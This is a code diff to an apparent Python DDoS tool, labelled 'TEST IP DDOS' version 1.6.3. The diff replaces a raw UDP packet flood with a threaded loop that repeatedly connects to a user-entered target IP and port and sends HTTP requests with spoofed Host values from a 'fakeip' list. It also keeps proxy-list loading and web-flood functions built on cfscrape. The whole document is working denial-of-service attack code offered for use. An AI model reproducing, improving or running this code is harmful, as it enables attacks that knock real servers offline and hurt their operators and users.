@@ -7,11 +7,6 @@ import socket
 import os
 
 os.system("clear")
-##############
-sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
-sock2 = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
-bytes = random._urandom(1490)
-#############
 
 s = cfscrape.create_scraper()
 
@@ -23,6 +18,9 @@ with open('proxyhttp') as file:
 
 with open('proxysocks') as file:
     proxy_socks = ''.join(file.readlines()).strip().split('\n')
+
+with open('fakeip') as file:
+    fakeip_list = ''.join(file.readlines()).strip().split('\n')
 
 def dosweb1(target):
     while True:
@@ -62,21 +60,14 @@ def dosweb2(target):
         except requests.exceptions.ConnectionError:
             print(colorama.Fore.RED + "[-] Connection error!")
 
-def ddosip(ip):
-    global send
+def ddosip():
     while True:
-        sock.sendto(bytes, (ip, port))
-        send = send + 1
-        print("[" + send + "]" + " Pocket sent")
-
-
-def aa(num):
-    while True:
-        try:
-            sock.sendto(bytes, (ip, port))
-            sock2.connect((ip, port))
-        except:
-            print(colorama.Fore.RED + "[-] Connection error!")
+        fake_ip = random.choice(fakeip_list)
+        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+        s.connect((ip, port))
+        s.sendto(("GET /" + ip + " HTTP/1.1\r\n").encode('ascii'), (ip, port))
+        s.sendto(("Host: " + fake_ip + "\r\n\r\n").encode('ascii'), (ip, port))
+        s.close()
 
 threads = 20
 
@@ -92,7 +83,6 @@ print("Version: 1.6.3: TEST IP DDOS \n")
 vibor = int(input("Attack for IP or Web [1-IP; 2-Web]: "))
 
 if (vibor == 1):
-    sent = 0
     ip = input("IP Target: ")
     port = int(input("Port: "))
 
@@ -102,7 +92,7 @@ if (vibor == 1):
         exit("Threads count is incorrect!")
 
     for i in range(0, threads):
-        ipddos = threading.Thread(target=aa, args=(1,))
+        ipddos = threading.Thread(target=ddosip)
         ipddos.start()
         print(colorama.Fore.GREEN + str(i + 1) + " thread started!")
 else:
